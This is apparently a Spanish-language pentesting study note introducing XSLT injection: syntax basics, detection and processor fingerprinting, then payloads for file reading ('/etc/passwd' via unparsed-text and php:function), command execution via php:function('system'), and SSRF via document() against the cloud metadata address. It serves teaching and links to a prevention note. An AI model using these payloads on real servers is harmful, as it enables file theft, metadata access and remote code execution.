---
tags:
  - Web/Red-Team
  - Pentesting/Explotacion
  - Server-Side/XSLT
  - Tipo/Introduccion
Descripción: "XSLT (eXtensible Stylesheet Language Transformations) es un lenguaje para transformar documentos XML en otros formatos —HTML, texto, otro XML—"
Fecha de actualización: 2026-06-22
Nota previa: ""
Nota siguiente: "[[01 - Prevención de XSLT]]"
Area: "[[XSLT.base|XSLT]]"
---
---

`XSLT` (eXtensible Stylesheet Language Transformations) es un lenguaje para **transformar documentos XML** en otros formatos —HTML, texto, otro XML—. Las apps lo usan para volcar datos de un XML dentro de una respuesta HTML. <mark style="background: #ADCCFFA6;">La `XSLT Injection` ocurre cuando el input del usuario se inserta en los datos XSL **antes** de que el procesador los transforme</mark>: el atacante inyecta elementos XSL que el procesador ejecuta al generar la salida. Es el último de los [[00 - Introducción a los ataques server-side|ataques server-side]] de este tema.

# XSLT en 30 segundos

Una hoja XSLT define la plantilla de salida y la rellena con datos del XML. Elementos clave: `<xsl:template match="...">` (a qué nodo aplica), `<xsl:value-of select="...">` (extrae el valor de un nodo), `<xsl:for-each select="...">` (itera), más `<xsl:sort>` y `<xsl:if test="...">`. Por ejemplo, sobre un XML de frutas:

```xslt
<xsl:template match="/fruits">
  Frutas:
  <xsl:for-each select="fruit">
    <xsl:value-of select="name"/> (<xsl:value-of select="color"/>)
  </xsl:for-each>
</xsl:template>
```

produce una línea por fruta. Lo relevante para el ataque: si controlamos parte de la hoja XSL, podemos añadir nuestros propios elementos `<xsl:...>`.

# Identificar la inyección

Igual que con [[01 - Identificación de SSTI|SSTI]], se empieza rompiendo la sintaxis. Un campo reflejado (p. ej. un nombre que aparece en la cabecera de una lista renderizada por XSLT) con un `<` suelto debería provocar un error de XML mal formado:

```
name=<
```

Un `500 Internal Server Error` no confirma, pero delata el problema. La confirmación —y un *fingerprint* valioso— llega inyectando elementos XSL que leen propiedades del sistema:

```xml
Version: <xsl:value-of select="system-property('xsl:version')" />
Vendor: <xsl:value-of select="system-property('xsl:vendor')" />
Vendor URL: <xsl:value-of select="system-property('xsl:vendor-url')" />
```

<mark style="background: #FF5582A6;">Si la respuesta interpreta estos elementos, la inyección está confirmada</mark> y, de paso, identificamos el procesador. (En XSLT **1.0**/`libxslt` solo existen `version`, `vendor` y `vendor-url`; `product-name`/`product-version` son de XSLT 2.0 y devuelven vacío en libxslt.) El *fingerprint* decide el payload: `vendor`=`libxslt` → PHP/XSLT 1.0 → probar `php:function`; `vendor`=`Saxonica` → Java/XSLT 2.0 → probar `unparsed-text`/`document`.

# Lectura de ficheros (LFI)

Qué función sirve depende de la **versión** y la **configuración** del procesador:

- **`unparsed-text`** (XSLT **2.0**) lee un fichero local:

```xml
<xsl:value-of select="unparsed-text('/etc/passwd', 'utf-8')" />
```

Pero `libxslt` solo soporta XSLT **1.0**, así que ahí falla. La vía real en stacks PHP:

- **`php:function`** (si el procesador admite funciones PHP — habitual con el `libxslt` de PHP): <mark style="background: #FFB86CA6;">llama a cualquier función PHP</mark>, incluida `file_get_contents`:

```xml
<xsl:value-of select="php:function('file_get_contents','/etc/passwd')" />
```

# Remote Code Execution (RCE)

Si el procesador permite funciones PHP, el salto a RCE es inmediato llamando a `system`:

```xml
<xsl:value-of select="php:function('system','id')" />
```

<mark style="background: #8000E1A6;">`php:function` es la llave maestra</mark>: convierte la inyección XSLT en ejecución de PHP arbitrario (LFI con `file_get_contents`, RCE con `system`/`passthru`). Por eso, en un objetivo PHP, lo primero tras confirmar es probar `php:function`.

> [!info]+ Más allá de PHP: `document()` y SSRF
> El elemento `<xsl:value-of select="document('http://169.254.169.254/...')"/>` puede forzar al procesador a **traer un recurso externo** → [[01 - Introducción a SSRF|SSRF]] / lectura de ficheros vía `document('file:///etc/passwd')`, incluso sin funciones PHP. **También funciona en `libxslt` (PHP)**, con dos gates de seguridad **independientes**: el vector de **red** (`http://`) lo corta `XSL_SECPREF_READ_NETWORK` y el de **fichero local** (`file://`) lo corta `XSL_SECPREF_READ_FILE` — para el SSRF importa el primero (no basta con desactivar `READ_FILE`). Es la vía principal cuando el procesador no es PHP (Java/Saxon, .NET). Como en [[00 - Motores de plantillas e introducción a SSTI|SSTI]], el payload concreto depende del motor —identifícalo primero—.

> [!info]+ Fuentes
> - [W3C — XSLT 3.0](https://www.w3.org/TR/xslt-30/) · [PortSwigger / HackTricks — XSLT Server Side Injection](https://book.hacktricks.xyz/pentesting-web/xslt-server-side-injection-extensible-stylesheet-language-transformations)
> - [PayloadsAllTheThings — XSLT Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSLT%20Injection)

El reverso defensivo cierra el sub-tema y el módulo: [[01 - Prevención de XSLT]].
